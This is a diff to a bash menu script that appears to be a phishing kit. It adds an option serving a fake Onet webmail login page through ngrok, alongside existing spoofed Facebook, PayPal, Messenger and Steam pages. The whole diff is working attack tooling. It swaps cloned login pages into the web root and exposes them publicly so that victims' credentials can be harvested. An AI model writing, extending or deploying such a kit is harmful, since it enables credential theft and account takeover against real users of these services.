@@ -11,6 +11,16 @@ facebook_login_page()
 	sudo rm /var/www/html/index.html
 }
 
+poczta_onetlogin_page()
+{
+	echo "wybrales fb";
+	sudo rm /var/www/html/index.html
+	sudo cp onet/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+
+
 
 
 facebook_secure_login_page()
@@ -128,7 +138,8 @@ echo -e "\e[31m  [8] PayPal\e[0m"
 echo -e "\e[31m  [9] Messenger\e[0m"
 echo -e "\e[31m  [10] Steam\e[0m"
 echo -e "\e[31m  [11] Facebook Secure Page\e[0m"
-echo -e "\e[92m  [12] EXIT \e[0m"
+echo -e "\e[31m  [12] Poczta Onet\e[0m"
+echo -e "\e[92m  [13] EXIT \e[0m"
 echo "================="
 
 
@@ -149,7 +160,8 @@ case "$opcja" in
   "9") messenger_login_page ;;
   "10") steam_login_page ;;
   "11") facebook_secure_login_page ;;
-  "12") exit_work ;;
+  "12") poczta_onetlogin_page ;;
+  "13") exit_work ;;
   *)  clear && ./run.sh
   
 esac
